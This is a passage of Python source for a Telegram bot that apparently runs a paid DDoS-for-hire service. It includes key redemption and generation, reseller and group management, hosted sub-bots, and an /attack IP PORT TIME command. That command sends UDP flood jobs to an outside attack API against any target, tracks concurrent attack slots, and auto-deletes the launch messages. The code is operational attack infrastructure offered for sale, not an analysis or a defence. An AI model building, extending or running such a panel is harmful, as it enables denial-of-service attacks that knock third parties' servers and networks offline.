                f"│ ❌ Failed: {fail}",
                "success"
            ))
        
        @hosted_bot.message_handler(commands=['redeem'])
        def hosted_redeem(msg):
            uid = str(msg.chat.id)
            args = msg.text.split()
            if len(args) != 2:
                hosted_bot.reply_to(msg, "⚠️ Usage: /redeem KEY")
                return
            key = args[1]
            if key not in keys_data:
                hosted_bot.reply_to(msg, "❌ Invalid key!")
                return
            key_info = keys_data[key]
            if key_info.get("used", False):
                hosted_bot.reply_to(msg, "❌ Key already used!")
                return
            if time.time() > key_info["expires_at"]:
                hosted_bot.reply_to(msg, "❌ Key expired!")
                del keys_data[key]
                save_keys(keys_data)
                return
            if uid not in hosted_bots.get(bot_token, {}).get("users", []):
                if bot_token not in hosted_bots:
                    hosted_bots[bot_token] = {"users": []}
                hosted_bots[bot_token]["users"].append(uid)
                save_hosted_bots(hosted_bots)
            if uid not in users:
                users.append(uid)
                users_data["users"] = users
                save_users(users_data)
            keys_data[key]["used"] = True
            keys_data[key]["used_at"] = time.time()
            keys_data[key]["used_by"] = uid
            save_keys(keys_data)
            expiry_str = datetime.fromtimestamp(key_info['expires_at'], tz=IST).strftime('%d %b %Y, %I:%M %p')
            content = (
                f"│ 🎉 User: {uid}\n"
                f"│ 🔑 Key: <code>{key}</code>\n"
                f"│ ⏰ Duration: {format_duration(key_info['duration_value'], key_info['duration_unit'])}\n"
                f"│ 📅 Expires: {expiry_str}\n"
                f"│ ⚡ Concurrent: {concurrent}"
            )
            hosted_bot.reply_to(msg, hstyled("ACCESS GRANTED", content, "success"), parse_mode="HTML")
        
        @hosted_bot.message_handler(commands=['status'])
        def hosted_status(msg):
            uid = str(msg.chat.id)
            current_time = format_ist_time(get_current_ist())
            if bot_token in hosted_bots:
                bot_info = hosted_bots[bot_token]
                now = time.time()
                active_list = []
                for aid, info in bot_info.get("active_attacks", {}).items():
                    if now < info["finish_time"]:
                        remaining = int(info["finish_time"] - now)
                        mins = remaining // 60
                        secs = remaining % 60
                        time_str = f"{mins}m {secs}s" if mins > 0 else f"{secs}s"
                        active_list.append(f"❌ SLOT {len(active_list)+1}: BUSY\n    🎯 {info['target_key']}\n    👤 {info['user']}\n    ⏰ {time_str} left")
                status_msg = f"📊 {bold('BOT STATUS')}\n📅 {current_time}\n\n"
                for i in range(bot_info["concurrent"]):
                    if i < len(active_list):
                        status_msg += active_list[i] + "\n\n"
                    else:
                        status_msg += f"✅ SLOT {i+1}: FREE\n    💡 Ready for attack\n\n"
                status_msg += f"📊 ACTIVE: {len(active_list)}/{bot_info['concurrent']}"
                hosted_bot.reply_to(msg, status_msg)
            else:
                hosted_bot.reply_to(msg, f"✅ ALL SLOTS FREE\n📅 {current_time}\n\nNo ongoing attacks detected!")
        
        @hosted_bot.message_handler(commands=['attack'])
        def hosted_attack(msg):
            uid = str(msg.chat.id)
            
            if uid not in users:
                hosted_bot.reply_to(msg, "❌ ACCESS DENIED!\n\nYou don't have an active key.\nUse /redeem KEY to activate your access.")
                return
            
            if not check_user_expiry(uid):
                hosted_bot.reply_to(msg, "❌ ACCESS EXPIRED!\n\nYour key has expired.\nUse /redeem KEY to get new access.")
                return
            
            args = msg.text.split()
            if len(args) != 4:
                hosted_bot.reply_to(msg, "⚠️ Usage: /attack IP PORT TIME\n📌 Example: /attack 1.1.1.1 443 60")
                return
            
            ip, port, duration = args[1], args[2], args[3]
            
            if not validate_ip(ip):
                hosted_bot.reply_to(msg, "❌ Invalid IP address!")
                return
            
            try:
                port = int(port)
                duration = int(duration)
                if duration < 10 or duration > 300:
                    hosted_bot.reply_to(msg, "❌ Duration must be 10-300 seconds!")
                    return
            except:
                hosted_bot.reply_to(msg, "❌ Invalid port or time!")
                return
            
            total_active = get_total_active_count()
            if total_active >= MAX_CONCURRENT:
                hosted_bot.reply_to(msg, f"❌ GLOBAL LIMIT REACHED!\n🌐 Total active attacks: {total_active}/{MAX_CONCURRENT}")
                return
            
            now = time.time()
            active_in_this_bot = 0
            if bot_token in hosted_bots:
                for aid, ainfo in hosted_bots[bot_token].get("active_attacks", {}).items():
                    if now < ainfo["finish_time"]:
                        active_in_this_bot += 1
                if active_in_this_bot >= concurrent:
                    hosted_bot.reply_to(msg, f"❌ THIS BOT'S LIMIT REACHED!\n📊 Active: {active_in_this_bot}/{concurrent}")
                    return
            
            if uid in hosted_cooldown_data:
                remaining = hosted_cooldown_data[uid] - now
                if remaining > 0:
                    hosted_bot.reply_to(msg, f"⏳ Wait {int(remaining)} seconds!")
                    return
            
            attack_id = f"hosted_{bot_token}_{uid}_{int(now)}_{random.randint(1000, 9999)}"
            target_key = f"{ip}:{port}"
            finish_time = now + duration
            
            target_under_attack = False
            if bot_token in hosted_bots:
                for aid, ainfo in hosted_bots[bot_token].get("active_attacks", {}).items():
                    if ainfo["target_key"] == target_key and now < ainfo["finish_time"]:
                        target_under_attack = True
                        break
            
            if target_under_attack:
                hosted_bot.reply_to(msg, f"❌ TARGET UNDER ATTACK!\n🎯 {target_key} already being attacked.")
                return
            
            hosted_cooldown_data[uid] = now + COOLDOWN_TIME
            
            if bot_token not in hosted_bots:
                hosted_bots[bot_token] = {"active_attacks": {}, "owner_id": owner_id, "owner_name": owner_name, "concurrent": concurrent, "users": []}
            if "active_attacks" not in hosted_bots[bot_token]:
                hosted_bots[bot_token]["active_attacks"] = {}
            
            hosted_bots[bot_token]["active_attacks"][attack_id] = {
                "user": uid,
                "finish_time": finish_time,
                "ip": ip,
                "port": port,
                "target_key": target_key
            }
            save_hosted_bots(hosted_bots)
            
            if uid not in hosted_bots[bot_token].get("users", []):
                hosted_bots[bot_token]["users"].append(uid)
                save_hosted_bots(hosted_bots)
            
            new_active = 0
            for aid, ainfo in hosted_bots[bot_token]["active_attacks"].items():
                if now < ainfo["finish_time"]:
                    new_active += 1
            new_total = get_total_active_count()
            current_time = format_ist_time(get_current_ist())
            
            content = f"│ 🎯 Target: {ip}:{port}\n│ ⏱️ Duration: {duration}s\n│ ⚡ Method: UDP (Auto)\n│ 📅 Time: {current_time}\n│ 📊 This Bot: {new_active}/{concurrent}\n│ 🌐 Global: {new_total}/{MAX_CONCURRENT}"
            sent = hosted_bot.reply_to(msg, hstyled("ATTACK LAUNCHED", content, "attack"))
            
            delete_delay = (duration + 10) if AUTO_DELETE_LAUNCH == "duration" else AUTO_DELETE_LAUNCH
            auto_delete_message(hosted_bot, msg.chat.id, sent.message_id, delete_delay)
            
            def run():
                send_attack_to_api(ip, port, duration, msg.chat.id, hosted_bot, is_hosted=True)
                if bot_token in hosted_bots and attack_id in hosted_bots[bot_token]["active_attacks"]:
                    del hosted_bots[bot_token]["active_attacks"][attack_id]
                    save_hosted_bots(hosted_bots)
            threading.Thread(target=run).start()
        
        def run_hosted_bot():
            try:
                hosted_bot.infinity_polling()
            except:
                pass
        
        threading.Thread(target=run_hosted_bot, daemon=True).start()
        time.sleep(3)
        return True
        
    except Exception as e:
        print(f"Failed to start hosted bot: {e}")
        return False

# ========== MAIN BOT COMMANDS ==========
@bot.message_handler(commands=['start'])
def start(msg):
    uid = str(msg.chat.id)
    chat_type = msg.chat.type
    current_time = format_ist_time(get_current_ist())
    
    if uid not in broadcast_users:
        broadcast_users.append(uid)
        broadcast_data["users"] = broadcast_users
        save_broadcast_users(broadcast_data)
    
    if uid not in users and uid not in ADMIN_ID:
        users.append(uid)
        users_data["users"] = users
        save_users(users_data)
    
    if check_maintenance():
        bot.reply_to(msg, styled_msg("MAINTENANCE MODE", "│ 🔧 Bot is under maintenance!", "warning"))
        return
    
    if chat_type in ["group", "supergroup"]:
        group_id = str(msg.chat.id)
        attack_time = groups.get(group_id, {}).get("attack_time", None)
        if attack_time:
            content = f"│ ✅ Group Approved!\n│ ⚡ Attack Time: {attack_time}s\n│ 📅 {current_time}\n│\n│ 📝 {bold('COMMANDS')}:\n│ /attack IP PORT\n│ /help\n│ /start"
            bot.reply_to(msg, styled_msg("GROUP ACTIVE", content, "success"))
        else:
            bot.reply_to(msg, styled_msg("GROUP NOT APPROVED", "│ ❌ Group not approved!\n│ 📞 Contact Admin", "error"))
        return
    
    if uid in ADMIN_ID:
        content = f"""│ ✅ Full Access
│ ⚡ Global Concurrent: {MAX_CONCURRENT}
│ ⏳ Cooldown: {COOLDOWN_TIME}s
│ ⏱️ Max Time: 300s
│ 📅 {current_time}
│
│ {bold('COMMANDS')}:
│
│ {bold('ATTACK')}:
│   /attack IP PORT TIME
│   /status
│   /cooldown
│   /setmax 1-100
│   /setcooldown 1-300
│
│ {bold('KEYS')}:
│   /genkey 1 or 5h
│   /removekey KEY
│
│ {bold('USERS')}:
│   /add USER_ID
│   /remove USER_ID
│   /addreseller USER_ID
│   /removereseller USER_ID
│
│ {bold('GROUPS')}:
│   /addgroup ID TIME
│   /removegroup ID
│   /allgroups
│
│ {bold('HOST BOT')}:
│   /host TOKEN ID CONCURRENT NAME
│   /unhost TOKEN
│   /allhosts
│
│ {bold('OTHER')}:
│   /maintenance on/off
│   /broadcast
│   /stopattack IP:PORT
│   /allusers
│   /api_status
│   /cleardb confirm"""
        bot.reply_to(msg, styled_msg("OWNER PANEL", content, "success"))
    
    elif uid in resellers:
        content = f"""│ ✅ Reseller Access
│ ⚡ Global Concurrent: {MAX_CONCURRENT}
│ ⏳ Cooldown: {COOLDOWN_TIME}s
│ 📅 {current_time}
│
│ {bold('COMMANDS')}:
│
│ {bold('ATTACK')}:
│   /attack IP PORT TIME
│   /status
│   /cooldown
│
│ {bold('KEYS')}:
│   /genkey 1 or 5h
│   /mykeys"""
        bot.reply_to(msg, styled_msg("RESELLER PANEL", content, "success"))
    
    elif uid in users:
        has_active = check_user_expiry(uid)
        status_text = "🟢 ACTIVE" if has_active else "🔴 EXPIRED"
        if has_active:
            content = f"""│ ✅ Status: {status_text}
│ ⚡ Global Concurrent: {MAX_CONCURRENT}
│ ⏳ Cooldown: {COOLDOWN_TIME}s
│ 📅 {current_time}
│
│ {bold('COMMANDS')}:
│
│ {bold('ATTACK')}:
│   /attack IP PORT TIME
│   /status
│   /cooldown
│
│ {bold('KEYS')}:
│   /redeem KEY
│
│ ℹ️ {bold('OTHER')}:
│   /help"""
            bot.reply_to(msg, styled_msg("USER PANEL", content, "success"))
        else:
            content = f"""│ ⚠️ Status: {status_text}
│ ⚡ Global Concurrent: {MAX_CONCURRENT}
│ 📅 {current_time}
│
│ 🔑 Your access has expired!
│
│ Use /redeem KEY to activate new access"""
            bot.reply_to(msg, styled_msg("ACCESS EXPIRED", content, "warning"))
    
    else:
        content = f"""│ ❌ Unauthorized Access
│
│ 🔑 Use /redeem KEY to activate
│
│ 📅 {current_time}
│
│ 🛒 Buy Access: Contact Admin"""
        bot.reply_to(msg, styled_msg("UNAUTHORIZED", content, "error"))

@bot.message_handler(commands=['help'])
def help_cmd(msg):
    uid = str(msg.chat.id)
    chat_type = msg.chat.type
    current_time = format_ist_time(get_current_ist())
    
    if check_maintenance():
        bot.reply_to(msg, styled_msg("MAINTENANCE MODE", "│ 🔧 Bot is under maintenance!", "warning"))
        return
    
    if chat_type in ["group", "supergroup"]:
        content = f"│ 📝 {bold('COMMANDS')}:\n│ /attack IP PORT\n│ /help\n│ /start\n│ 📅 {current_time}"
        bot.reply_to(msg, styled_msg("GROUP HELP", content))
        return
    
    if uid in ADMIN_ID:
        content = f"""│ 👑 {bold('OWNER HELP')}
│
│ {bold('ATTACK')}:
│   /attack IP PORT TIME
│   /status
│   /cooldown
│   /setmax 1-100
│   /setcooldown 1-300
│
│ {bold('KEYS')}:
│   /genkey 1 or 5h
│   /removekey KEY
│
│ {bold('USERS')}:
│   /add USER
│   /remove USER
│   /addreseller USER
│   /removereseller USER
│
│ {bold('GROUPS')}:
│   /addgroup ID TIME
│   /removegroup ID
│   /allgroups
│
│ {bold('HOST BOT')}:
│   /host TOKEN ID CONCURRENT NAME
│   /unhost TOKEN
│   /allhosts
│
│ {bold('OTHER')}:
│   /maintenance on/off
│   /broadcast
│   /stopattack IP:PORT
│   /allusers
│   /api_status
│   /cleardb confirm
│
│ 📅 {current_time}"""
        bot.reply_to(msg, styled_msg("OWNER HELP", content))
    
    elif uid in resellers:
        content = f"""│ 💎 {bold('RESELLER HELP')}
│
│ {bold('ATTACK')}:
│   /attack IP PORT TIME
│   /status
│   /cooldown
│
│ {bold('KEYS')}:
│   /genkey 1 or 5h
│   /mykeys
│
│ 📅 {current_time}"""
        bot.reply_to(msg, styled_msg("RESELLER HELP", content))
    
    elif uid in users:
        if check_user_expiry(uid):
            content = f"""│ 🔥 {bold('USER HELP')}
│
│ {bold('ATTACK')}:
│   /attack IP PORT TIME
│   /status
│   /cooldown
│
│ {bold('KEYS')}:
│   /redeem KEY
│
│ 📅 {current_time}"""
            bot.reply_to(msg, styled_msg("USER HELP", content))
        else:
            content = f"""│ ⚠️ {bold('ACCESS EXPIRED')}
│
│ Use /redeem KEY to activate
│
│ 📅 {current_time}"""
            bot.reply_to(msg, styled_msg("HELP", content, "warning"))
    
    else:
        content = f"""│ ❌ {bold('UNAUTHORIZED')}
│
│ Use /redeem KEY to activate
│
│ 📅 {current_time}"""
        bot.reply_to(msg, styled_msg("HELP", content, "error"))

@bot.message_handler(commands=['cooldown'])
def cooldown_cmd(msg):
    uid = str(msg.chat.id)
    
    if check_maintenance():
        bot.reply_to(msg, styled_msg("MAINTENANCE MODE", "│ 🔧 Bot is under maintenance!", "warning"))
        return
    
    if uid not in users and uid not in ADMIN_ID and uid not in resellers:
        bot.reply_to(msg, styled_msg("UNAUTHORIZED", "│ ❌ Use /redeem KEY to activate", "error"))
        return
    
    if uid in cooldown:
        remaining = COOLDOWN_TIME - (time.time() - cooldown[uid])
        if remaining > 0:
            bot.reply_to(msg, f"⏳ Cooldown: {int(remaining)} seconds remaining!")
        else:
            del cooldown[uid]
            bot.reply_to(msg, "✅ No cooldown! You can attack now.")
    else:
        bot.reply_to(msg, "✅ No cooldown! You can attack now.")

@bot.message_handler(commands=['setcooldown'])
def set_cooldown(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, styled_msg("ACCESS DENIED", "│ ❌ Owner only!", "error"))
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /setcooldown 1-300")
        return
    
    try:
        new_cooldown = int(args[1])
        if new_cooldown < 1 or new_cooldown > 300:
            bot.reply_to(msg, "❌ Value 1-300!")
            return
    except:
        bot.reply_to(msg, "❌ Invalid number!")
        return
    
    global COOLDOWN_TIME
    COOLDOWN_TIME = new_cooldown
    settings["cooldown"] = new_cooldown
    save_settings(settings)
    
    bot.reply_to(msg, f"✅ COOLDOWN UPDATED!\n⏳ New: {COOLDOWN_TIME}s")

@bot.message_handler(commands=['setmax'])
def set_max_concurrent(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, styled_msg("ACCESS DENIED", "│ ❌ Owner only!", "error"))
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /setmax 1-100")
        return
    
    try:
        new_max = int(args[1])
        if new_max < 1 or new_max > 100:
            bot.reply_to(msg, "❌ Value 1-100!")
            return
    except:
        bot.reply_to(msg, "❌ Invalid number!")
        return
    
    global MAX_CONCURRENT
    MAX_CONCURRENT = new_max
    settings["max_concurrent"] = new_max
    save_settings(settings)
    
    bot.reply_to(msg, f"✅ GLOBAL CONCURRENT UPDATED!\n⚡ New: {MAX_CONCURRENT}")

@bot.message_handler(commands=['attack'])
def attack(msg):
    uid = str(msg.chat.id)
    chat_type = msg.chat.type
    is_group = (chat_type in ["group", "supergroup"])
    
    if check_maintenance():
        bot.reply_to(msg, styled_msg("MAINTENANCE MODE", "│ 🔧 Bot is under maintenance!", "warning"))
        return
    
    if is_group:
        attack_time_limit = groups.get(str(msg.chat.id), {}).get("attack_time", None)
        if not attack_time_limit:
            bot.reply_to(msg, styled_msg("GROUP NOT APPROVED", "│ ❌ Group not approved!\n│ 📞 Contact Admin", "error"))
            return
        
        args = msg.text.split()
        if len(args) != 3:
            bot.reply_to(msg, "⚠️ Usage: /attack IP PORT")
            return
        ip, port = args[1], args[2]
        duration = attack_time_limit
    else:
        if uid not in users:
            bot.reply_to(msg, styled_msg("ACCESS DENIED", "│ ❌ Use /redeem KEY to activate", "error"))
            return
        
        if not check_user_expiry(uid):
            bot.reply_to(msg, styled_msg("ACCESS EXPIRED", "│ ⚠️ Use /redeem KEY to get new access", "warning"))
            return
        
        if uid in cooldown:
            remaining = COOLDOWN_TIME - (time.time() - cooldown[uid])
            if remaining > 0:
                bot.reply_to(msg, f"⏳ Wait {int(remaining)} seconds!")
                return
        
        args = msg.text.split()
        if len(args) != 4:
            bot.reply_to(msg, "⚠️ Usage: /attack IP PORT TIME")
            return
        ip, port, duration = args[1], args[2], args[3]
        try:
            duration = int(duration)
        except:
            bot.reply_to(msg, "❌ Invalid time!")
            return
    
    if not validate_ip(ip):
        bot.reply_to(msg, "❌ Invalid IP address!")
        return
    
    try:
        port = int(port)
        if port < 1 or port > 65535:
            bot.reply_to(msg, "❌ Port must be 1-65535!")
            return
    except:
        bot.reply_to(msg, "❌ Invalid port!")
        return
    
    max_limit = attack_time_limit if is_group else 300
    if duration < 10 or duration > max_limit:
        bot.reply_to(msg, f"❌ Duration 10-{max_limit}s!")
        return
    
    total_active = get_total_active_count()
    if total_active >= MAX_CONCURRENT:
        bot.reply_to(msg, f"❌ GLOBAL LIMIT REACHED!\n🌐 {total_active}/{MAX_CONCURRENT}")
        return
    
    existing_attack = check_active_attack_by_target(ip, port)
    if existing_attack:
        remaining = int(existing_attack["finish_time"] - time.time())
        bot.reply_to(msg, f"❌ TARGET UNDER ATTACK!\n🎯 {ip}:{port}\n⏰ {remaining}s left")
        return
    
    if not is_group:
        cooldown[uid] = time.time()
    
    attack_id = f"{uid}_{int(time.time())}_{random.randint(1000, 9999)}"
    target_key = f"{ip}:{port}"
    finish_time = time.time() + duration
    
    active_attacks[attack_id] = {
        "user": uid,
        "finish_time": finish_time,
        "ip": ip,
        "port": port,
        "target_key": target_key,
        "start_time": time.time()
    }
    
    new_total = get_total_active_count()
    current_time = format_ist_time(get_current_ist())
    
    content = f"│ 🎯 Target: {ip}:{port}\n│ ⏱️ Duration: {duration}s\n│ ⚡ Method: UDP (Auto)\n│ 📅 {current_time}\n│ 🌐 Global Active: {new_total}/{MAX_CONCURRENT}\n│ 🔄 Sending to API..."
    sent = bot.reply_to(msg, styled_msg("ATTACK LAUNCHED", content, "attack"))
    
    delete_delay = (duration + 10) if AUTO_DELETE_LAUNCH == "duration" else AUTO_DELETE_LAUNCH
    auto_delete_message(bot, msg.chat.id, sent.message_id, delete_delay)
    
    def run():
        send_attack_to_api(ip, port, duration, msg.chat.id, bot, is_hosted=False)
        if attack_id in active_attacks:
            del active_attacks[attack_id]
    
    threading.Thread(target=run).start()

@bot.message_handler(commands=['status'])
def status(msg):
    uid = str(msg.chat.id)
    
    if check_maintenance():
        bot.reply_to(msg, styled_msg("MAINTENANCE MODE", "│ 🔧 Bot is under maintenance!", "warning"))
        return
    
    if uid not in users and uid not in ADMIN_ID and uid not in resellers:
        bot.reply_to(msg, styled_msg("UNAUTHORIZED", "│ ❌ Use /redeem KEY to activate", "error"))
        return
    
    now = time.time()
    slots = []
    for attack_id, info in active_attacks.items():
        if now < info["finish_time"]:
            remaining = int(info["finish_time"] - now)
            mins = remaining // 60
            secs = remaining % 60
            time_str = f"{mins}m {secs}s" if mins > 0 else f"{secs}s"
            slots.append(f"❌ BUSY\n    🎯 {info['target_key']}\n    👤 {info['user']}\n    ⏰ {time_str} left")
    
    status_msg = f"📊 {bold('ATTACK STATUS')}\n📅 {format_ist_time(get_current_ist())}\n\n"
    
    for i in range(MAX_CONCURRENT):
        if i < len(slots):
            status_msg += slots[i] + "\n\n"
        else:
            status_msg += f"✅ SLOT {i+1}: FREE\n    💡 Ready for attack\n\n"
    
    status_msg += f"📊 TOTAL: {len(slots)}/{MAX_CONCURRENT}\n"
    status_msg += f"🌐 GLOBAL: {get_total_active_count()}/{MAX_CONCURRENT}"
    
    if uid in cooldown:
        remaining = COOLDOWN_TIME - (time.time() - cooldown[uid])
        if remaining > 0:
            status_msg += f"\n\n⏳ YOUR COOLDOWN: {int(remaining)}s"
    
    bot.reply_to(msg, status_msg)

@bot.message_handler(commands=['host'])
def host_bot(msg):
    uid = str(msg.chat.id)
    
    if check_maintenance():
        bot.reply_to(msg, styled_msg("MAINTENANCE MODE", "│ 🔧 Bot is under maintenance!", "warning"))
        return
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, styled_msg("ACCESS DENIED", "│ ❌ Owner only!", "error"))
        return
    
    args = msg.text.split()
    if len(args) != 5:
        bot.reply_to(msg, "⚠️ Usage: /host BOT_TOKEN USER_ID CONCURRENT NAME")
        return
    
    bot_token = args[1]
    owner_id = args[2]
    try:
        concurrent = int(args[3])
        if concurrent < 1 or concurrent > 20:
            bot.reply_to(msg, "❌ Concurrent 1-20!")
            return
    except:
        bot.reply_to(msg, "❌ Invalid concurrent value!")
        return
    
    owner_name = args[4]
    
    hosted_bots[bot_token] = {
        "owner_id": owner_id,
        "owner_name": owner_name,
        "concurrent": concurrent,
        "blocked": False,
        "active_attacks": {},
        "users": [],
        "resellers": []
    }
    save_hosted_bots(hosted_bots)
    
    if start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
        current_time = format_ist_time(get_current_ist())
        content = f"│ 🔑 Token: {bot_token[:20]}...\n│ 👑 Owner: {owner_id}\n│ 📛 Name: {owner_name}\n│ ⚡ Concurrent: {concurrent}\n│ 🌐 Global Limit: {MAX_CONCURRENT}\n│ 📅 Started: {current_time}\n│\n│ 💡 Bot is now live!"
        bot.reply_to(msg, styled_msg("HOSTED BOT STARTED", content, "success"))
    else:
        bot.reply_to(msg, styled_msg("HOSTED BOT FAILED", "│ ❌ Failed to start!\n│ Check token!", "error"))

@bot.message_handler(commands=['unhost'])
def unhost_bot(msg):
    uid = str(msg.chat.id)
    
    if check_maintenance():
        bot.reply_to(msg, styled_msg("MAINTENANCE MODE", "│ 🔧 Bot is under maintenance!", "warning"))
        return
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, styled_msg("ACCESS DENIED", "│ ❌ Owner only!", "error"))
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /unhost BOT_TOKEN")
        return
    
    bot_token = args[1]
    
    if bot_token in hosted_bots or bot_token in hosted_bot_instances:
        stop_hosted_bot(bot_token)
        bot.reply_to(msg, styled_msg("HOSTED BOT STOPPED", f"│ ✅ Stopped!\n│ 🔑 {bot_token[:20]}...", "success"))
    else:
        bot.reply_to(msg, "❌ Hosted bot not found!")

@bot.message_handler(commands=['allhosts'])
def all_hosts(msg):
    if check_maintenance():
        bot.reply_to(msg, styled_msg("MAINTENANCE MODE", "│ 🔧 Bot is under maintenance!", "warning"))
        return
    
    if str(msg.chat.id) not in ADMIN_ID:
        bot.reply_to(msg, styled_msg("ACCESS DENIED", "│ ❌ Owner only!", "error"))
        return
    
    host_list = []
    for token, info in hosted_bots.items():
        status = "🔴 BLOCKED" if info.get("blocked", False) else "🟢 ACTIVE"
        host_list.append(f"🔑 {token[:20]}...\n   👑 {info['owner_id']}\n   📛 {info['owner_name']}\n   ⚡ {info['concurrent']}\n   {status}")
    
    if host_list:
        bot.reply_to(msg, f"📋 {bold('ALL HOSTED BOTS')}:\n\n" + "\n\n".join(host_list) + f"\n\n📊 Total: {len(hosted_bots)}")
    else:
        bot.reply_to(msg, "📋 No hosted bots found!")

@bot.message_handler(commands=['maintenance'])
def maintenance(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, styled_msg("ACCESS DENIED", "│ ❌ Owner only!", "error"))
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /maintenance on or off")
        return
    
    global maintenance_mode
    status = args[1].lower()
    
    if status == "on":
        maintenance_mode = True
        bot.reply_to(msg, styled_msg("MAINTENANCE MODE", "│ 🔧 ENABLED\n│ Bot commands disabled.", "warning"))
    elif status == "off":
        maintenance_mode = False
        bot.reply_to(msg, styled_msg("MAINTENANCE MODE", "│ ✅ DISABLED\n│ Bot is operational!", "success"))
    else:
        bot.reply_to(msg, "❌ Invalid! Use on or off")

@bot.message_handler(commands=['genkey'])
def genkey(msg):
    uid = str(msg.chat.id)
    
    if check_maintenance():
        bot.reply_to(msg, styled_msg("MAINTENANCE MODE", "│ 🔧 Bot is under maintenance!", "warning"))
        return
    
    if uid not in ADMIN_ID and uid not in resellers:
        bot.reply_to(msg, styled_msg("ACCESS DENIED", "│ ❌ Admin or Reseller only!", "error"))
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /genkey 1 or /genkey 5h")
        return
    
    value, unit = parse_duration(args[1])
    if value is None:
        bot.reply_to(msg, "❌ Invalid! Use 1 or 5h")
        return
    
    key = generate_key()
    expires_at = get_expiry_date(value, unit)
    keys_data[key] = {"user_id": "pending", "duration_value": value, "duration_unit": unit, "generated_by": uid, "generated_at": time.time(), "expires_at": expires_at.timestamp(), "used": False}
    save_keys(keys_data)
    
    expiry_str = expires_at.strftime('%d %b %Y, %I:%M %p')
    content = (
        f"│ 🔑 {bold('Key')}:\n"
        f"│ <code>{key}</code>\n"
        f"│\n"
        f"│ ⏰ Duration: {format_duration(value, unit)}\n"
        f"│ 📅 Expires: {expiry_str}\n"
        f"│\n"
        f"│ 👆 Tap key to copy!"
    )
    bot.reply_to(msg, styled_msg("KEY GENERATED", content, "success"), parse_mode="HTML")

@bot.message_handler(commands=['removekey'])
def remove_key(msg):
    uid = str(msg.chat.id)
    
    if check_maintenance():
        bot.reply_to(msg, styled_msg("MAINTENANCE MODE", "│ 🔧 Bot is under maintenance!", "warning"))
        return
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, styled_msg("ACCESS DENIED", "│ ❌ Owner only!", "error"))
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /removekey KEY")
        return
    
    key = args[1]
    if key not in keys_data:
        bot.reply_to(msg, "❌ Key not found!")
        return
    
    del keys_data[key]
    save_keys(keys_data)
    bot.reply_to(msg, f"✅ KEY REMOVED!\n🔑 {key}")

@bot.message_handler(commands=['add'])
def add_user(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, styled_msg("ACCESS DENIED", "│ ❌ Owner only!", "error"))
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /add USER_ID")
        return
    
    new_user = args[1]
    if new_user in ADMIN_ID:
        bot.reply_to(msg, "❌ Cannot add owner!")
        return
    if new_user in users:
        bot.reply_to(msg, f"❌ User already has access!")
        return
    
    users.append(new_user)
    users_data["users"] = users
    save_users(users_data)
    bot.reply_to(msg, f"✅ USER ADDED!\n👤 {new_user}")

@bot.message_handler(commands=['remove'])
def remove_user(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, styled_msg("ACCESS DENIED", "│ ❌ Owner only!", "error"))
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /remove USER_ID")
        return
    
    target_user = args[1]
    if target_user in ADMIN_ID:
        bot.reply_to(msg, "❌ Cannot remove owner!")
        return
    if target_user not in users:
        bot.reply_to(msg, f"❌ User not found!")
        return
    
    users.remove(target_user)
    users_data["users"] = users
    save_users(users_data)
    bot.reply_to(msg, f"✅ USER REMOVED!\n👤 {target_user}")

@bot.message_handler(commands=['addreseller'])
def add_reseller(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, styled_msg("ACCESS DENIED", "│ ❌ Owner only!", "error"))
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /addreseller USER_ID")
        return
    
    new_reseller = args[1]
    if new_reseller in ADMIN_ID:
        bot.reply_to(msg, "❌ Cannot add owner!")
        return
    if new_reseller in resellers:
        bot.reply_to(msg, f"❌ Already a reseller!")
        return
    
    resellers.append(new_reseller)
    if new_reseller not in users:
        users.append(new_reseller)
    users_data["users"] = users
    users_data["resellers"] = resellers
    save_users(users_data)
    bot.reply_to(msg, f"✅ RESELLER ADDED!\n👤 {new_reseller}")

@bot.message_handler(commands=['removereseller'])
def remove_reseller(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, styled_msg("ACCESS DENIED", "│ ❌ Owner only!", "error"))
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /removereseller USER_ID")
        return
    
    target = args[1]
    if target not in resellers:
        bot.reply_to(msg, f"❌ Not a reseller!")
        return
    
    resellers.remove(target)
    users_data["resellers"] = resellers
    save_users(users_data)
    bot.reply_to(msg, f"✅ RESELLER REMOVED!\n👤 {target}")

@bot.message_handler(commands=['addgroup'])
def add_group(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, styled_msg("ACCESS DENIED", "│ ❌ Owner only!", "error"))
        return
    
    args = msg.text.split()
    if len(args) != 3:
        bot.reply_to(msg, "⚠️ Usage: /addgroup GROUP_ID TIME")
        return
    
    group_id = args[1]
    try:
        attack_time = int(args[2])
        if attack_time < 10 or attack_time > 300:
            bot.reply_to(msg, "❌ Attack time 10-300s!")
            return
    except:
        bot.reply_to(msg, "❌ Invalid time!")
        return
    
    groups[group_id] = {"attack_time": attack_time, "added_by": uid, "added_at": time.time()}
